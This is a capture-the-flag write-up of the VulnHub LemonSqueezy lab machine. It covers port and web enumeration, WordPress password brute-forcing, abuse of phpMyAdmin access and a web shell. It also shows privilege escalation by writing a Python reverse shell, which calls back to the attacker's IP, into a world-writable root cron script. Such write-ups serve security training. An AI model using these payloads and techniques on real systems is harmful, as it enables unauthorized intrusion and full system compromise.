# Ports Scan & Enumeration
## Ports Scan
```bash
┌──(htb㉿kali)-[~/Writeups/VulnHub/LemonSqueezy]
└─$ nmap -Pn -p- 192.168.59.170
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-07 11:08 AEST
Nmap scan report for 192.168.59.170
Host is up (0.0046s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.20 seconds

┌──(htb㉿kali)-[~/Writeups/VulnHub/LemonSqueezy]
└─$ nmap -Pn -p80 -A 192.168.59.170
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-07 11:09 AEST
Nmap scan report for 192.168.59.170
Host is up (0.00078s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Apache2 Debian Default Page: It works

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.26 seconds
```

## Web Service
### nikto
- Apache 2.4.25
- /phpmyadmin/
```bash
┌──(htb㉿kali)-[~/Writeups/VulnHub/LemonSqueezy]
└─$ nikto -host 192.168.59.170
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.59.170
+ Target Hostname:    192.168.59.170
+ Target Port:        80
+ Start Time:         2021-05-07 11:10:46 (GMT10)
---------------------------------------------------------------------------
+ Server: Apache/2.4.25 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.25 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 29cd, size: 5a323b988acba, mtime: gzip
+ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST
+ Uncommon header 'x-ob_mode' found, with contents: 1
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpmyadmin/: phpMyAdmin directory found
+ 7915 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2021-05-07 11:11:50 (GMT10) (64 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

### gobuster
- /wordpress
- /phpmyadmin
- /javascript                            Forbidden
```bash
┌──(htb㉿kali)-[~/Writeups/VulnHub/LemonSqueezy]
└─$ gobuster dir -u http://192.168.59.170/ -x txt,html,htm,php,jsp,asp,aspx -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.59.170/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,html,htm,php,jsp,asp,aspx
[+] Timeout:                 10s
===============================================================
2021/05/07 11:20:48 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10701]
/wordpress            (Status: 301) [Size: 320] [--> http://192.168.59.170/wordpress/]
/manual               (Status: 301) [Size: 317] [--> http://192.168.59.170/manual/]
/javascript           (Status: 301) [Size: 321] [--> http://192.168.59.170/javascript/]
/phpmyadmin           (Status: 301) [Size: 321] [--> http://192.168.59.170/phpmyadmin/]
/server-status        (Status: 403) [Size: 279]

===============================================================
2021/05/07 11:33:18 Finished
===============================================================
```

### Wordpress
- Username: orange
- Username: lemon
```bash
┌──(htb㉿kali)-[~/Writeups/VulnHub/LemonSqueezy]
└─$ wpscan -e ap,at,u,m --url http://192.168.59.170/wordpress
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17

       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://192.168.59.170/wordpress/ [192.168.59.170]
[+] Started: Fri May  7 11:32:47 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.25 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.59.170/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.59.170/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.59.170/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.59.170/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.8.9 identified (Insecure, released on 2019-03-13).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.59.170/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.8.9'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.59.170/wordpress/, Match: 'WordPress 4.8.9'

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating All Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:57 <================================> (22423 / 22423) 100.00% Time: 00:00:57
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] twentyfifteen
 | Location: http://192.168.59.170/wordpress/wp-content/themes/twentyfifteen/
 | Last Updated: 2021-03-09T00:00:00.000Z
 | Readme: http://192.168.59.170/wordpress/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 2.9
 | Style URL: http://192.168.59.170/wordpress/wp-content/themes/twentyfifteen/style.css
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.59.170/wordpress/wp-content/themes/twentyfifteen/, status: 500
 |
 | Version: 1.8 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.59.170/wordpress/wp-content/themes/twentyfifteen/style.css, Match: 'Version: 1.8'

[+] twentyseventeen
 | Location: http://192.168.59.170/wordpress/wp-content/themes/twentyseventeen/
 | Last Updated: 2021-04-27T00:00:00.000Z
 | Readme: http://192.168.59.170/wordpress/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 2.7
 | Style URL: http://192.168.59.170/wordpress/wp-content/themes/twentyseventeen/style.css
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.59.170/wordpress/wp-content/themes/twentyseventeen/, status: 500
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.59.170/wordpress/wp-content/themes/twentyseventeen/style.css, Match: 'Version: 1.3'

[+] twentysixteen
 | Location: http://192.168.59.170/wordpress/wp-content/themes/twentysixteen/
 | Last Updated: 2021-03-09T00:00:00.000Z
 | Readme: http://192.168.59.170/wordpress/wp-content/themes/twentysixteen/readme.txt
 | [!] The version is out of date, the latest version is 2.4
 | Style URL: http://192.168.59.170/wordpress/wp-content/themes/twentysixteen/style.css
 | Style Name: Twenty Sixteen
 | Style URI: https://wordpress.org/themes/twentysixteen/
 | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead ...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.59.170/wordpress/wp-content/themes/twentysixteen/, status: 500
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.59.170/wordpress/wp-content/themes/twentysixteen/style.css, Match: 'Version: 1.3'

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:01 <================================> (100 / 100) 100.00% Time: 00:00:01

[i] No Medias Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <======================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] orange
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] lemon
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri May  7 11:34:21 2021
[+] Requests Done: 22603
[+] Cached Requests: 10
[+] Data Sent: 6.286 MB
[+] Data Received: 19.971 MB
[+] Memory used: 267.477 MB
[+] Elapsed time: 00:01:34
```

- From source page of wordpress, we got the hostname: [lemonsqueezy](view-source:http://lemonsqueezy/)

- Try to bruteforce the users password:
```bash
┌──(htb㉿kali)-[~/Writeups/VulnHub/LemonSqueezy]
└─$ wpscan -U users -P /usr/share/wordlists/rockyou.txt --url http://192.168.59.170/wordpress
...[snip]...
[+] Performing password attack on Xmlrpc against 2 user/s
[SUCCESS] - orange / ginger
```


# WebServices
## Wordpress
- user: orange
- password: ginger
![[Pasted image 20210507114648.png]]
- Login successfully, need to check around.
![[Pasted image 20210507114724.png]]
- Here's one keep safe post draft
![[Pasted image 20210507114810.png]]
- This looks like some credential: `n0t1n@w0rdl1st!`, hmmmm, "not in a wordlist"? Sooooo, in other wordlist? Not just one? Tried this credential with different username on phpmyadmin, work on user orange.
- Got extra hostname from mailbox: `orange@squeezy.org.au`, also put in /etc/hosts
![[Pasted image 20210507114957.png]]

## phpmyadmin
- user: orange
- password: n0t1n@w0rdl1st!
![[Pasted image 20210507131142.png]]
- Wordpress user lemon
![[Pasted image 20210507131234.png]]
- hmmmmm, we can try to crack it, but, on second thoughts, since we have control of the db already, why not just create a new account, it's more easy, no?
- Even more easier idea, let's make user orange become admin user, hahaha
![[Pasted image 20210507131554.png]]
![[Pasted image 20210507133056.png]]
- And now we have it. :D
![[Pasted image 20210507133147.png]]

## Reverse Shell
- Tried everything I can on wordpress, but hmm, all theme files, plugins files are readonly, file upload is disabled by removing temp folder.
- So there's only way of dropping file, is by phpmyadmin.
![[Pasted image 20210507180436.png]]
![[Pasted image 20210507180526.png]]
![[Pasted image 20210507180730.png]]# Privesc
## Reconn
- */2 *   * * *   root    /etc/logrotate.d/logrotate
- 
```bash
┌──(htb㉿kali)-[~/Writeups/VulnHub/LemonSqueezy]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [192.168.59.60] from (UNKNOWN) [192.168.59.170] 59166
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@lemonsqueezy:/var/www/html/wordpress$ ^Z
[1]+  Stopped                 nc -lvnp 9001
┌──(htb㉿kali)-[~/Writeups/VulnHub/LemonSqueezy]
└─$ stty raw -echo
┌──(htb㉿kali)-[~/Writeups/VulnHub/LemonSqueezy]
nc -lvnp 9001

www-data@lemonsqueezy:/var/www/html/wordpress$ stty rows 96 cols 116
www-data@lemonsqueezy:/var/www/html/wordpress$ export TERM=xterm
www-data@lemonsqueezy:/var/www/html/wordpress$ ls
index.php    wp-activate.php       wp-config-sample.php  wp-includes        wp-mail.php       xmlrpc.php
license.txt  wp-admin              wp-config.php         wp-links-opml.php  wp-settings.php
readme.html  wp-blog-header.php    wp-content            wp-load.php        wp-signup.php
sh3ll.php    wp-comments-post.php  wp-cron.php           wp-login.php       wp-trackback.php
www-data@lemonsqueezy:/var/www/html/wordpress$ cd ~
www-data@lemonsqueezy:/var/www$ cd /home
www-data@lemonsqueezy:/home$ ls -al
total 12
drwxr-xr-x  3 root   root   4096 Apr 13  2020 .
drwxr-xr-x 23 root   root   4096 Apr 13  2020 ..
drwxr-xr-x 17 orange orange 4096 Apr 26  2020 orange

[+] Cron jobs
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs
*/2 *   * * *   root    /etc/logrotate.d/logrotate

www-data@lemonsqueezy:/dev/shm$ ls -al /etc/logrotate.d/logrotate
-rwxrwxrwx 1 root root 101 Apr 26  2020 /etc/logrotate.d/logrotate

www-data@lemonsqueezy:/dev/shm$ cat /etc/logrotate.d/logrotate
#!/usr/bin/env python
import os
import sys
import socket
import subprocess
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.59.60",9002))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```
- Then wait for the time coming.
```bash
┌──(htb㉿kali)-[/opt/peas/linPEAS]
└─$ nc -lvnp 9002
listening on [any] 9002 ...
connect to [192.168.59.60] from (UNKNOWN) [192.168.59.170] 35578
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cd ~
# ls -al
total 44
drwx------  6 root root 4096 Apr 26  2020 .
drwxr-xr-x 23 root root 4096 Apr 13  2020 ..
-rw-------  1 root root 2761 Apr 26  2020 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwx------  2 root root 4096 Apr 13  2020 .cache
drwx------  4 root root 4096 Apr 13  2020 .config
drwxr-xr-x  3 root root 4096 Apr 13  2020 .local
-rw-------  1 root root  699 Apr 13  2020 .mysql_history
drwxr-xr-x  2 root root 4096 Apr 26  2020 .nano
-rw-r--r--  1 root root  148 Aug 18  2015 .profile
-rw-r--r--  1 root root   39 Apr 26  2020 root.txt
# cat root
cat: root: No such file or directory
# cat root.txt
NvbWV0aW1lcyBhZ2FpbnN0IHlvdXIgd2lsbC4=
```